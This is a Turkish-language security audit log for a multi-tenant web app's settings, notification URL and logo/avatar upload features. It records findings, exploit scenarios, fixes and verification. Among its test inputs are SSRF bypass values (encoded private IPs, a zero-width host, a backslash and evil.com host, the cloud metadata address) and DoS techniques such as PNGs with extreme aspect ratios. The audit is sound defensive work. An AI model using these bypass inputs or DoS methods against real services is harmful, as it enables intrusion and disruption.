İstismar senaryosu: Audit okuma yetkisi olan biri (Super Admin, audit CSV dışa aktarımı) env'deki servis kimlik bilgisini görür. whatsapp-bildirim servisi bugün kimlik doğrulamasız olduğu için etkisi düşük.
Düzeltme: `env.ts` tek kaynak olan `waServiceUrlSchema` ile doğrulama yapmalı; boş değere ayrıca izin verilmeli. Kurala uymayan env değerinde açılış hata vermeli (fail-fast). Runbook'a "env adresi panel kuralıyla aynı" notu eklenmeli. (atanan ajan: backend-dev; runbook notu: devops)

### [DÜŞÜK] B-P12b-4 Adres normalize edilmeden saklanıyor; ondalık/onaltılı/percent-encoded host ve görünmez `\p{Cf}` karakterleri kabul ediliyor — A09 Security Logging (yanıltıcı audit/ekran)

Yer: `packages/contracts/src/api/system-settings.ts:142` (`WA_URL_RE` yalnız `\p{Cc}` dışlıyor), `:158` (transform yalnız sondaki `/` kırpıyor)
Sorun: Node'da denendi (`isInsecureServiceUrl`, production=true):

- `http://3232235777` → `192.168.1.1`, `http://0x7f.1` → `127.0.0.1`, `http://%31%30.0.0.1` → `10.0.0.1`: zod kabul ediyor, ham hâli saklanıyor.
- `http://exa​mple.com` (sıfır genişlikli boşluk, `\p{Cf}`) zod'dan geçiyor. Ekranda ve audit'te `example.com` gibi görünüyor; WHATWG bu karakteri atıyor.

K13 sınıflandırması ve fetch aynı WHATWG ayrıştırıcısını kullandığı için **bypass yok** (ayrıntı aşağıda). Sorun, audit okuyucusunun ve ikinci Super Admin'in gerçekte hangi hosta gidildiğini ham metinden anlayamaması. Projenin diğer alanlarında kullanılan `CONTROL_CHARS` (`\p{Cf}\p{Zl}\p{Zp}` dahil) burada uygulanmıyor.
İstismar senaryosu: Ele geçirilmiş bir Super Admin hesabı, iç ağ ya da dış adresi zararsız görünen bir biçimde kaydeder (ör. `http://3232235777:3000`). Denetim sırasında bu adres fark edilmez.
Düzeltme: Transform aşamasında `new URL(v)` ile kanonik `origin + pathname` (sondaki `/` kırpılmış) saklanmalı. Regex'e `\p{Cf}\p{Zl}\p{Zp}` eklenmeli ve DB CHECK deseni aynı şekilde genişletilmeli (zod ↔ CHECK birebir kuralı). İstenirse host için yalnız noktalı ondalık IPv4, köşeli IPv6 ya da LDH ad kabul edilebilir. (atanan ajan: backend-dev; CHECK: dba)

### [DÜŞÜK] B-P12b-5 Test ucunda sistem geneli tavan yok, PUT/DELETE sınırsız — A04 (kaynak tüketimi / audit şişmesi)

Yer: `apps/server/src/settings/routes.ts:76` (yalnız `perUser` 5/dk); `:100-108` (PUT/DELETE için sınır yok)
Sorun: MySQL testinde B-P11-4 ile 20/dk global tavan var, WhatsApp testinde yok. Her PUT bir audit satırı yazıyor ve sınırı yok.
İstismar senaryosu: Çalınmış bir Super Admin oturumu döngüyle PUT atarak `audit_logs` tablosunu şişirir (silinemez tablo, saklama süresine kadar kalır) ve gerçek olayları gürültüye gömer. Birden çok Super Admin hesabıyla test ucu 5/dk × N hızla iç ağa yoklama yapar.
Düzeltme: Test ucuna MySQL testindeki gibi `global` 20/dk eklenmeli. PUT/DELETE'e kullanıcı başına makul bir sınır (ör. 30/dk) ya da `changed:false` durumunda audit yazmama kuralı eklenmeli (aydınlatma metni kalıbı). (atanan ajan: backend-dev)

### [DÜŞÜK] B-P12b-6 Yanıt gövdesi tüketilmiyor/iptal edilmiyor — A05

Yer: `apps/server/src/notify/whatsapp.ts:285-289`
Sorun: Zaman aşımı yalnız başlıklar gelene kadar geçerli. Başlıklar gelince zamanlayıcı temizleniyor ve gövde hiç okunmuyor. Undici'de okunmayan gövde, GC'ye kadar soketi ve tamponu tutabiliyor. Gövdenin yansıtılmaması doğru (sızıntı yok); eksik olan kaynak serbest bırakma.
İstismar senaryosu: Super Admin'in seçtiği (ya da ele geçirilmiş) bir servis, sonsuz ve yavaş gövdeli 200 yanıtlar döner. Her bildirim ve denemede bir soket açık kalır (saatte en çok 300 + yeniden denemeler).
Düzeltme: Sonuç sınıflandırıldıktan sonra `void res.body?.cancel()` çağrılmalı (`FetchLike` dönüş tipine `body` eklenmeli). (atanan ajan: backend-dev)

## Odak maddeleri — doğrulama sonuçları (bulgu yok)

- **K13 bypass (production + http + genel adres → kanal kapalı):** `isInsecureServiceUrl` ham metne değil, WHATWG `new URL(...).hostname` değerine bakıyor. Fetch de aynı ayrıştırıcıyı kullanıyor, bu yüzden iki taraf arasında ayrıştırma farkı yok. Node'da denenen girdiler:
  - Ondalık/onaltılı/percent-encoded özel IP → özel (doğru).
  - `[::ffff:127.0.0.1]` → özel, `[::ffff:8.8.8.8]` → genel (BlockList IPv4-mapped eşliyor).
  - `0.0.0.0`, `localhost.` ve tüm DNS adları → genel → kapalı (fail-closed; DNS çözülmüyor, rebinding yok).
  - `http://10.0.0.1\evil.com` → host `10.0.0.1` (ters bölü yol ayırıcı; fetch de aynı hosta gidiyor).
  - Userinfo (`@`) regex ile yasak, bu yüzden `http://10.0.0.1@evil` hilesi yok.
  - `endpoint()` yalnız `/…` ekliyor; host bölümünü değiştiremiyor.

  Kapalı kanalda hem test hem gönderim istek atmıyor (`test()` ön kontrolü + `post()` içinde `usable`).

- **Yönlendirme:** `redirect:"manual"` gerçek Node 24 fetch'iyle denendi: 307 → `status 307, ok:false`, hedef sunucuya istek **gitmedi**. Sonuç `redirect`, sabit mesaj.
- **Yanıt sızıntısı:** test yanıtı yalnız `{ok, message}` döndürüyor ve mesaj `WA_TEST_MESSAGES` sabitlerinden geliyor. Gövde, durum kodu, hata metni ve adres istemciye dönmüyor. Log'a yalnız `status`/`err.name`/`path` yazılıyor (numara ve adres yazılmıyor).
- **Zaman aşımı:** 8 sn, `AbortController` ile DNS + bağlantı + başlıkları kapsıyor (gövde için B-P12b-6).
- **Yetki:** plugin seviyesinde `requireAuth` + `requireSuperAdmin` preHandler var. Admin/User 403 alıyor. Web sayfası da 403'te uyarı gösteriyor, ama son söz sunucuda.
- **CSRF:** PUT/DELETE/POST `requireAuth` içinde double-submit + Origin kontrolünden geçiyor.
- **Tenant'a adres sızması (T33):** tenant `GET /settings/support-requests` yalnız `serviceConfigured`/`insecure` döndürüyor (`requests/panel.ts:230`). Tenant testi `{ok, message}` döndürüyor; `reason` ve adres çıkarılmış (`panel.ts:309`).
- **Audit:** numaralar `maskPhone` ile maskeleniyor (Super Admin testinde `phone`, tenant testinde `recipient`). `url` açık yazılıyor. Panel kuralı userinfo/sorgu yasakladığı ve servis kimlik doğrulamasız olduğu için bu uygun (env istisnası için B-P12b-3). Eski→yeni değer ve kaynak kaydediliyor.
- **Rate limit:** test 5/dk/kullanıcı (6. → 429), zod sonrası sayılıyor. Geçersiz girdi kotayı tüketmiyor.
- **Runtime değişim:** sürmekte olan yeniden denemeler sonraki çağrıda yeni adresi kullanıyor (belgelenmiş). Güvensiz adrese geçişte alarm logu var, adres yazılmıyor.
- **DB CHECK ↔ zod:** desen aynı. ICU'da `\z` kullanıldığı için sondaki `\n` reddediliyor. `secret_enc IS NULL`. Zod daha katı (UTF-16 uzunluk + WHATWG ayrıştırma), DB ise son savunma hattı. Fark B-P12b-1/-4'te. `down.sql` koruması var (satır varsa hiçbir şey değişmeden duruyor).
- **Gizli bilgi:** diff'te sır yok. `89.252.189.211` varsayılanı zaten herkese açık (env varsayılanı/AC-152); yalnız `check-app-grants.sh` test verisinde geçiyor.

## Bilgi (bulgu değil — T33 risk kabulü)

- İç ağ adresi bilerek serbest. "Özel" listesi `169.254.0.0/16` (bulut metadata) ve `100.64/10` aralıklarını da içeriyor. Bu yüzden production'da `http://169.254.169.254` kanalı açık tutuyor. Yine de istek yalnız `POST` + JSON gövde ile gidiyor ve yanıt yansıtılmıyor; IMDSv2 ve GCP metadata bu isteği kabul etmez.
- Test ucu sınırlı bir kör yoklama kehaneti sunuyor: ekranda `ok`, `timeout` ve "diğer" ayrımı görünüyor, audit'teki `reason` ise `redirect`/`http_error`/`unreachable` ayrımını da veriyor. Super Admin güvenilir aktör olduğundan kabul edilebilir.
- Öneri (Sonra): K13 sınıflandırmasında link-local aralığı "özel" yerine "genel" sayılabilir. Ayrıca bildirim hedefini değiştiren sistem ayarları için yeniden kimlik doğrulama (step-up 2FA) düşünülebilir.

## Otomatik tarama çıktıları

- `pnpm audit --audit-level=moderate`: **No known vulnerabilities found**.
- `git grep` gizli bilgi deseni (test/docs hariç): eşleşme yok.
- `git log --all -- '*.env*'`: yalnız `.env.example`.

## Tasarımda vaat edilip kodda bulunmayanlar

- Yok. T33 r3 maddelerinin (kaynak önceliği, yalnız SUPER_ADMIN, URL kuralı, yönlendirme izlenmemesi, K13, tenant'a sızmama) hepsi kodda bulundu.

## Olumlu

- Test sonuçları sabit mesajlarla ve sınıflandırılmış nedenlerle dönüyor. Servis yanıtı hiçbir yerde yansıtılmıyor.
- K13 kontrolü her `setUrl` çağrısında etkin adresten yeniden hesaplanıyor. Güvensiz adreste test ve gönderim ağa hiç çıkmıyor.
- Tek kaynak `waServiceUrlSchema` (web + server) ve onunla birebir DB CHECK var. Down migration veri kaybını engelleyen bir korumayla geliyor.
- Tenant yanıtlarından `reason` ve adres bilinçli olarak çıkarılmış.

---

# Güvenlik Raporu — P12 turu — Doğrulama turu 1 (2026-11-13)

DURUM: GEÇTİ
Özet: Kritik 0 / Yüksek 0 / Orta 0 / Düşük 0 açık. B-P12-1, -2, -4 ve -5 kapandı. B-P12-3 P13'e devredildi; şu an kalıcı silme yok, yalnız pasife alma var, bu yüzden açık değil. Gereksinimler §9'a "Sonra (P13)" olarak eklenmeli.

Kapsam: implementation.md "P12 — Düzeltme turu 1". Okunan dosyalar: `uploads/{image,files}.ts`, `lib/gate.ts`, contracts `branding.ts`, web `(auth)/layout.tsx` ve `lib/server-api.ts` (`publicGet`), runbook §16. `test/unit/image-p12.test.ts` koşuldu: **15/15** geçti. Resim hattı sınırları sharp ile yeniden denendi.

## Kapanan bulgular

- **B-P12-1 (Orta) → KAPANDI.** `(auth)/layout.tsx:16` artık `publicGet` ile çağırıyor (`server-api.ts:91-99`) ve `forwardHeaders(headers(), readEdgeSecret())` iletiyor. XFF yalnız `X-Edge-Auth` sabit zamanlı karşılaştırmayla doğrulandığında gidiyor. Caddy dışarıdan gelen `X-Edge-Auth` başlığını siliyor (`Caddyfile:37,103,186,196`). Çerez iletilmiyor; public uç için doğru. Sonuç: 60/dk sınırı ziyaretçi başına işliyor. Edge sırrı yoksa (geliştirme ortamı) XFF gitmez ve sahte IP hiçbir yere yazılmaz.
- **B-P12-2 (Düşük) → KAPANDI.** `image.ts:52-57,82`: kod çözmeden önce, metadata üzerinde kenar ≥ 16 px, oran logo ≤ 20:1, avatar ≤ 4:1 kontrolü var. Kod çözme/kodlama adımı `imageGate` (2 çalışan / 4 bekleyen / 10 sn) içinde; dolu kapı 429 + `Retry-After: 5`. Yeniden ölçüm:

  | Girdi                                    | Önce     | Şimdi                               |
  | ---------------------------------------- | -------- | ----------------------------------- |
  | 1×23.900.000 PNG (logo)                  | 4.439 ms | 3 ms, reddedildi                    |
  | 16×1.499.999                             | —        | reddedildi                          |
  | 1095×21900 (sınırdaki 20:1, ~24 MP) logo | —        | 26 ms; aralıklı (interlaced) 168 ms |
  | 2449×9796 (4:1) avatar                   | —        | 18 ms                               |

  Sınır içindeki en kötü durum yaklaşık 170 ms; kapıyla birlikte en çok 2 eşzamanlı iş. Kapı mantığı (`lib/gate.ts`) mevcut ve testli kod. Zaman aşımında bekleyen kuyruktan çıkarılıyor, `finally` içinde slot bırakılıyor; sızıntı yok.

- **B-P12-4 (Düşük) → KAPANDI.** `files.ts:33-35`: avatar `private, no-cache`, logo `public, max-age=300`. Rotalarda tenant/yetki/DB eşleşmesi `sendFile`'dan önce yapılıyor; 304 yalnız bunlardan sonra dönüyor (oturum kapalıysa 401, kaldırılmış avatar için 404).
- **B-P12-5 (Düşük) → KAPANDI.** Runbook'ta `/api/v1/public/files` yolu kalmadı. İzinler doğru yazılmış: dizinler 0750, dosyalar 0640 (`runbook.md:1152,1241,1245`).
- **B-P12-3 (Düşük) → P13'e DEVİR.** `implementation.md:3501-3505`: bugün `deletedAt` set eden bir silme akışı yok. Pasife alınan kaydın dosyası bilinçli olarak korunuyor, çünkü yeniden etkinleştirmede geri gelmesi gerekiyor. P13'te yapılacaklar: avatar_path/logo_path null'lanacak, dosya ve tenant klasörü silinecek, audit yazılacak, saklama süresi tanımlanacak. Gerekçe kabul edildi; gereksinimler §9'a "Sonra (P13)" olarak eklenmeli.

## Yeni bulgu

- Yok.

## Otomatik tarama

- gitleaks v8.30.1, `.next` hariç: `apps/agent-win`, `apps/server`, `apps/web/*` (`.next` dışındaki 23 öğe), `packages`, `docs`, `deploy` → toplam 28 yol, yol başına ayrı koşu. **Toplam bulgu 0, tüm koşularda exit 0.**
  - Not: Görevdeki tek komutluk biçim (`dir /repo/apps /repo/packages …`) ilk yolu tarıyor gibi görünüyor ve `.next` dahil 13 bulgu, exit 1 veriyor. Bu 13 bulgunun hepsi `apps/web/.next/**` altında (build çıktısı; git-ignore'da, repoda 0 dosya). CI'da `.next` hariç tutulmalı ya da gitleaks yol başına çalıştırılmalı (devops notu).
- Bağımlılık değişikliği yok; `pnpm audit` sonucu kod turu 1'deki gibi temiz.

---

# Güvenlik Raporu — P12 turu (marka: logo/avatar/tema) — Kod turu 1 (2026-11-13)

DURUM: GEÇTİ
Özet: Kritik 0 / Yüksek 0 / Orta 1 / Düşük 4. Önerilen "Sonra" maddeleri gereksinimler §9'a: B-P12-1..5.

Kapsam: `git diff HEAD` (commit edilmemiş P12). Okunan dosyalar: `apps/server/src/uploads/{image,multipart,files,routes,service,store,urls}.ts`, `auth/{routes,session,guards}.ts`, `mail/{service,templates}.ts`, `sessions/public.ts`, `requests/service.ts`, `audit/read.ts`, `users/service.ts`; contracts `api/branding.ts`; web `proxy.ts`, `app/layout.tsx`, `app/(auth)/layout.tsx`, `lib/theme.ts`, `lib/server-api.ts`, `lib/edge-forward.ts`; `deploy/{Caddyfile,docker-compose.yml,nginx/*.conf}`, `apps/server/Dockerfile`, runbook §16. Resim hattı, sunucudaki sharp/file-type sürümleriyle ayrıca denendi (aşağıda). Staging'e bağlanılmadı.

## Bulgular (öncelik sırasıyla)

### [ORTA] B-P12-1 Giriş ekranı marka çağrısı tüm ziyaretçiler için tek IP kovasında: kimliksiz kişi logoyu herkes için düşürebilir (A04 Insecure Design / kullanılabilirlik)

Yer: `apps/web/app/(auth)/layout.tsx:15` (`serverGet`), `apps/web/lib/server-api.ts:75-82` (XFF iletilmiyor), `apps/server/src/uploads/files.ts:75-80` (60/dk/IP).
Sorun: `/login`, `/forgot-password` ve `/reset-password` sunucuda `GET /public/branding` çağırıyor. `serverGet`, `forwardHeaders` kullanmıyor, yani istemci IP'si iletilmiyor. Server isteği web konteynerinin IP'sinden görüyor (güvenilen proxy, XFF yok). Bu yüzden tüm ziyaretçiler aynı 60/dk kovasını paylaşıyor.
İstismar: Kimliksiz bir saldırgan dakikada 61 kez `GET /login?tenant=x` gönderir. Kova 60 sn bloklanır ve o süre içinde tüm kullanıcıların giriş ekranında firma/sistem logosu yerine yedek Nokta logosu çıkar. Saldırgan bunu sürekli tekrarlayabilir. AC-82 işlevi bozulur. Kimlik doğrulama ya da veri etkilenmez. Ayrıca sahte bir giriş sayfasını gerçeğinden ayırmayı zorlaştıran bir marka karmaşası oluşur.
Düzeltme: Marka çağrısında `resolveSessionToken` gibi `forwardHeaders(await headers(), readEdgeSecret())` iletilmeli; XFF yalnız `X-Edge-Auth` doğruysa gider. Alternatif olarak web IP'si bu kovadan muaf tutulup web tarafında kısa süreli bir önbellek kullanılabilir. Test: aynı web IP'sinden 61 render geldiğinde başka bir istemcinin logosu bozulmamalı. (atanan ajan: frontend-dev; server tarafında muafiyet seçilirse backend-dev)

### [DÜŞÜK] B-P12-2 Aşırı en-boy oranlı PNG logo, istek başına ~4,4 sn CPU harcıyor; eşzamanlı işleme sınırı yok (A04 / DoS)

Yer: `apps/server/src/uploads/image.ts:31-46`, `apps/server/src/uploads/routes.ts:27-31` (kullanıcı başına 20/sa, eşzamanlılık sınırı yok).
Sorun: `limitInputPixels` 24 MP toplam pikseli sınırlıyor ama boyut oranını sınırlamıyor. Ölçülen değerler (sharp 0.35.5, yerel): 93 KB'lık 1×23.900.000 PNG logo yolunda 4.439 ms; 2×11.900.000 PNG 2.269 ms; 24.000.000×1 PNG logo yolunda RSS +225 MB. Avatar yolunda (`cover`) bu dosyalar 1 ms'de `affine: output coordinates out of range` hatasıyla reddediliyor. Normal 4800×4800 PNG/JPEG/WEBP 6–30 ms, aralıklı (interlaced) PNG ise ~160 ms sürüyor.
İstismar: `settings.edit` yetkili bir Admin (ya da ele geçirilmiş Admin hesabı), 20 isteği eşzamanlı gönderir (sınır sayaç bazlı, eşzamanlılık bazlı değil). Sonuç yaklaşık 90 sn libvips CPU'su olur ve libuv/libvips iş parçacığı havuzu dolar. Aynı havuzu kullanan argon2 doğrulaması (giriş) gecikir. Saldırı yetkiyle ve saatlik sınırla kısıtlı olduğu için Düşük.
Düzeltme: (1) `metadata()` sonrasında `width`/`height` için alt sınır (ör. ≥ 16 px) ve oran sınırı (ör. max/min ≤ 32) konmalı, aşan `INVALID_IMAGE` almalı. (2) Süreç genelinde 2 eşzamanlı resim işi için semafor eklenmeli, kuyruk dolarsa 429/503 dönmeli. (3) Testler: 1×N ve N×1 PNG → 400. (atanan ajan: backend-dev)

### [DÜŞÜK] B-P12-3 Silinen kullanıcı/firmanın avatar ve logo dosyaları diskte kalıyor (A04 / KVKK veri saklama)

Yer: `apps/server/src/users/service.ts` silme akışı ve `tenants/service.ts` firma silme akışı. `avatarPath`/`logoPath` temizliği yalnız `uploads/service.ts` içinde var.
Sorun: Soft-delete sonrasında dosya sunulmuyor, çünkü `files.ts:51,67` `deletedAt: null` şartını arıyor; ama dosya `uploads` volume'unda ve yedeklerde süresiz duruyor. Avatar kişisel veridir.
İstismar: Doğrudan bir istismar yolu yok. Saklama süresi/silme hakkı yükümlülüğü karşılanmıyor.
Düzeltme: Kullanıcı ve firma silmede, commit sonrasında `dropFile` çağrılmalı (ya da yolun null'lanması P13 retention işine bağlanmalı). Runbook §16.5'e de not düşülmeli. (atanan ajan: backend-dev)

### [DÜŞÜK] B-P12-4 Avatar yanıtı tarayıcıda 5 dk `private` önbellekte kalıyor (A01 / A04)

Yer: `apps/server/src/uploads/files.ts:32`.
Sorun: Avatar kaldırıldığında, kullanıcı silindiğinde ya da görüntüleyenin oturumu kapandığında, aynı tarayıcı profili dosyayı ≤ 300 sn daha önbellekten gösterebilir. Paylaşımlı bilgisayarda çıkıştan sonra da görünebilir. Adlar rastgele olduğu için tahmin edilemez; risk düşük.
Düzeltme: Avatar için `Cache-Control: private, no-cache` kullanılmalı (ETag/304 korunur, her seferinde yetki yeniden doğrulanır). Logo `public, max-age=300` olarak kalabilir. (atanan ajan: backend-dev)

### [DÜŞÜK] B-P12-5 Runbook'ta var olmayan `/api/v1/public/files/...` yolu geçiyor (A05 yapılandırma/dokümantasyon)

Yer: `docs/runbook.md:1150`, `deploy/docker-compose.yml` (UPLOADS_DIR yorum satırı).
Sorun: Kodda yalnız `/api/v1/files/{logo,system-logo,avatar}` var. Yanlış yol, ileride Caddy'de yanlış bir istisna ya da kural yazılmasına yol açabilir.
Düzeltme: Metin `/api/v1/files/...` olarak düzeltilmeli. Ayrıca runbook §16.3'teki "dosyalar node:node 644" ifadesi gerçekte 0640 (`store.ts:40`); bu da düzeltilmeli. (atanan ajan: devops)

## Odak maddeleri — doğrulama sonuçları (bulgu yok)

- **Tür kontrolü:** `file-type` (magic bytes) ile sharp `metadata().format` ikisi de {png, jpeg, webp} olmalı (`image.ts:26-41`). Denendi: SVG, HTML, GIF, TIFF ve AVIF 400; kesilmiş PNG 400 (`failOn:"error"`). İstemcinin bildirdiği MIME türü ve dosya adı kullanılmıyor (`multipart.ts`).
- **Polyglot:** PNG'nin sonuna HTML/script eklenmiş dosya kabul ediliyor ama **yeniden kodlanmış** yeni bir PNG yazılıyor (sona eklenen bayt atılıyor; denendi). Sunulan dosya her zaman sunucu çıktısı.
- **Piksel bombası:** 24 MP üstü (4899² ve 5000²) metadata aşamasında 1 ms'de reddediliyor. Animasyonlu WEBP (100 ve 200 kare) `pages:1` ile yalnız ilk kare işleniyor, çıktı `pages=1`. APNG'de libvips yalnız varsayılan görüntüyü çözüyor.
- **Metadata:** EXIF (GPS benzeri alan), ICC (p3) ve XMP içeren JPEG'in çıktısında exif/icc/xmp = false (denendi). `rotate()` yönlendirmeyi piksellere uyguluyor.
- **Gövde sınırı:** Content-Length > 2 MiB+16 KiB okunmadan 413. Chunked gövdede busboy `fileSize` + `throwFileSizeLimit` → 413. `files:1, fields:0, parts:1`. multipart ayrıştırıcısı yalnız upload eklenti bağlamında kayıtlı. Gövde, auth/CSRF → yetki → hedef → hız sınırı sırası tamamlanmadan okunmuyor (`routes.ts`; Fastify'da rota düzeyi preHandler, eklenti hook'undan sonra çalışıyor).
- **Ad / yol:** 18 bayt `randomBytes` base64url. Yol sunucuda kuruluyor; ön ek ve ad için regex + `resolve` kök kontrolü (`store.ts:26-31`). DB CHECK'leri aynı kuralı ve ön ek = satırın tenant'ı eşleşmesini zorluyor (`check-app-grants.sh` P12 satırları). Path traversal yolu bulunamadı.
- **Atomik yazım ve yarışlar:** `wx` + fsync + rename. TX içinde `SELECT … FOR UPDATE`. Eski dosya commit sonrasında siliniyor, TX düşerse yeni dosya siliniyor. İki eşzamanlı yükleme ya da yükleme+kaldırma senaryosunda yetim dosya veya kayıp referans çıkmıyor (akış incelendi).
- **Sunumda izolasyon:** Logo yalnız `tenants.logo_path` ile tam eşleşirse, sistem logosu yalnız `system_settings` ile eşleşirse, avatar yalnız oturum + (Super Admin veya kendi tenant'ı) + aktif bir kullanıcının `avatar_path` değeriyle eşleşirse sunuluyor. Sunumda kendi tenant'ı esas (`auth.user.tenantId`), seçili firma değil. Liste/audit yanıtlarındaki `avatarUrl`, `canViewAvatar` ile süzülüyor. Müşteri sayfasında teknisyen avatarı yok.
- **Avatar IDOR:** Başka bir kullanıcının avatarı için `users.edit` + `loadOrThrow({tenantId})` (kapsam dışı → 404) + `canManage` (geniş yetkili hedef → 403) şartı var. Super Admin (tenantId null) bir tenant kapsamından yüklenemiyor.
- **Başlıklar:** `nosniff`, `default-src 'none'; frame-ancestors 'none'; sandbox`, Content-Type uzantıdan sunucu tarafında belirleniyor (yalnız png/webp yazılıyor), `inline`, public dosyalarda CORP cross-origin. ETag adın özeti; ad zaten rastgele ve URL'de açık olduğu için yeni bir sızıntı yok. 304 dönmeden önce DB eşleşmesi yapılıyor (oracle yok).
- **Public branding:** Bilinmeyen, geçersiz ve pasif slug aynı biçimde `{name:null, sistem logosu}` dönüyor. Aktif slug firma adını veriyor; bu tasarım gereği (giriş ekranı). Pasif firmanın logo dosyası, adı bilinirse sunulmaya devam ediyor (`files.ts:51` yalnız `deletedAt`); logo zaten herkese açık bilgi, bulgu değil.
- **`x-rs-tenant`:** proxy dışarıdan gelen başlığı her istekte siliyor ve yalnız `tenantSlugSchema`'ya uyan değeri yazıyor. Layout `encodeURIComponent` ile yalnız iç API'ye (`API_INTERNAL_URL`, sabit) gönderiyor; server değeri yeniden doğruluyor. CR/LF `Headers.set`'te reddediliyor. SSRF veya başlık enjeksiyonu yolu yok. Matcher dışındaki yollar (`/api`, statik) bu layout'u render etmiyor.
- **Tema:** `rs_theme` değeri `cookieToTheme` → sabit küme → `htmlThemeClass` ile yalnız `"light"|"dark"|undefined` olarak HTML'e yansıyor. Ham değer hiçbir yerde HTML'e yazılmıyor, XSS yolu yok. HttpOnly olmaması bilinçli bir seçim ve değer gizli değil. PATCH `/auth/me/preferences`: `requireAuth` (CSRF double-submit + Origin), `strictObject` + enum, yalnız kendi kaydı; değişiklik audit'e yazılıyor.
- **E-posta logosu:** URL = `PUBLIC_BASE_URL` + sunucuda kurulan yol (regex'ten geçmiş). `renderMailHtml` içinde `esc()` uygulanıyor. Konu satırına girmiyor; header/HTML enjeksiyonu yok. Logo çözülemezse sabit yedeğe düşülüyor.
- **Altyapı:** Caddy `@upload` / `@notUpload` birbirini dışlıyor; 3 MiB yalnız 4 POST ucunda (test-caddy.sh kapsıyor). nginx 3m. Volume `node:node 0700`, dizinler 0750, dosyalar 0640; kök fs salt okunur; volume Caddy'ye bağlanmıyor. Yedek `umask 077` + `chmod 600`, `--network none`, `:ro`.

## Otomatik tarama çıktıları

- `pnpm audit --audit-level=moderate` → "No known vulnerabilities found" (exit 0). Yeni bağımlılıklar: `sharp@0.35.5`, `file-type@22.3.0`, `@fastify/multipart@10.1.8`, `react-easy-crop@6.2.5`.
- Lisans: sharp Apache-2.0; `@img/sharp-libvips-*` LGPL-3.0-or-later (dinamik bağlı, AGPL/GPL değil; runbook §16.4 ve `check-licenses.mjs` izinli sayıyor); file-type MIT; @fastify/multipart MIT; react-easy-crop MIT. Yasak lisans yok.
- gitleaks v8.30.1 (`dir apps packages docs deploy`, `--redact`) → **exit 1, 13 bulgu, hepsi `apps/web/.next/**`** (build çıktısı: `prerender-manifest.json`, `preview-props.json`, `server-reference-manifest.json`, `.next/cache/*`; Next'in her derlemede ürettiği preview/encryption anahtarları). `.next/` git-ignore'da (`.gitignore:14`) ve `git ls-files apps/web/.next` = 0. **`.next` hariç kaynakta bulgu 0.** Değerler yazdırılmadı.

## Tasarımda vaat edilip kodda bulunmayanlar

- Yok. (Sistem logosunu kaldırma bu pakette bilinçli olarak yok; db-notlari P12 açık nokta 1.)

## Olumlu

- Tür kontrolü ve yeniden kodlama iki katmanlı; sunulan bayt her zaman sunucu çıktısı. SVG/HTML hiçbir yolla geçmiyor.
- Gövde, yetki/hedef/hız sınırı geçilmeden okunmuyor; ret durumları `upload.rejected` (fail) olarak audit'e yazılıyor.
- Dosya yalnız DB'deki güncel yolla sunuluyor; eski ve yetim dosyalar 404. DB CHECK'leri yol kuralını şemada da zorluyor.
- Proxy'nin iç başlığı silip yeniden yazması doğru desen.

---

# Güvenlik Raporu — P11 turu — Doğrulama turu 1 (2026-11-12)

DURUM: GEÇTİ
Özet: Kritik 0 / Yüksek 0 / Orta 0 / Düşük 0 açık (+ 2 madde "Sonra"). Kod turu 1'deki B-P11-1, -2, -5 ve -6 kapandı. B-P11-3 ve B-P11-4 kısmen kapandı; kalan kısımları "Sonra".

Kapsam: implementation.md "P11 — Düzeltme turu 1" (`:3315-3344`). Okunan dosyalar: `settings/{system,routes}.ts`, `lib/crypto.ts`, `audit/read.ts`, contracts `system-settings.ts`, `mysql-form.tsx`, `tr.json`, `test/helpers/secrets.ts`, `settings-p11.test.ts`. `test/unit/p11.test.ts` koşuldu: 14/14 geçti. Entegrasyon testleri tekrar koşulmadı; backend'in bildirdiği sonuç 445/445.

| Bulgu                                                     | Durum                         | Doğrulama                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| --------------------------------------------------------- | ----------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| B-P11-1 (Orta) Kayıtlı şifrenin başka hedefe gönderilmesi | KAPANDI                       | PUT: kayıtlı şifre varken host/port/user değişip şifre gelmezse 400 `fields.password` dönüyor; kontrol TX içinde, `before` okunduktan sonra (`system.ts:109`). Şifre artık `aadFor.mysqlSecret` ile hedefe bağlı AAD (`system_settings.secret_enc:mysql:<host küçük harf>:<port>:<user>`, `crypto.ts:19`) altında saklanıyor. DB'de `value_json` elle değiştirilirse çözülemez → GET `hasPassword:false`, test `secret_unreadable` dönüyor ve probe çağrılmıyor (`:96, :152-155, :163`). Test, şifreyi `rec.core` ile girdinin hedefi aynıysa ve hedefe bağlı AAD ile çözülebiliyorsa kullanıyor; env şifresi yalnız env hedefinde kullanılıyor (`:157-160`). AAD birleştirmesi belirsizlik yaratmıyor: host şemasında `:` yalnız köşeli IPv6 içinde, port sayısal. Test edilen durumlar: farklı host, port ve user ile çözüm reddediliyor (`settings-p11.test.ts:72`); iki adımlı akış testi eklenmiş. Not: eski AAD biçimiyle yazılmış satır çözülemez ve `hasPassword:false` olur; P11 henüz yayında değil, staging'de etkisi yok. |
| B-P11-2 (Düşük) gitleaks / sahte test değeri              | KAPANDI                       | Değer `test/helpers/secrets.ts` (`FAKE_P11_TURN_SECRET`) dosyasına taşındı ve import ediliyor (`settings-p11.test.ts:11`). Allowlist değişmedi. Tarama aşağıda.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| B-P11-3 (Düşük) Test bağlantısında TLS yok                | KISMİ → "Sonra"               | Arayüzde uyarı var (`mysql-form.tsx:169`, `my.tlsNote`: "şifre ağda şifrelenmeden gider; yalnız güvenilir iç ağ"). Sunucuda TLS seçeneği ve `allowPublicKeyRetrieval` daraltması "Sonra" (backend-dev).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
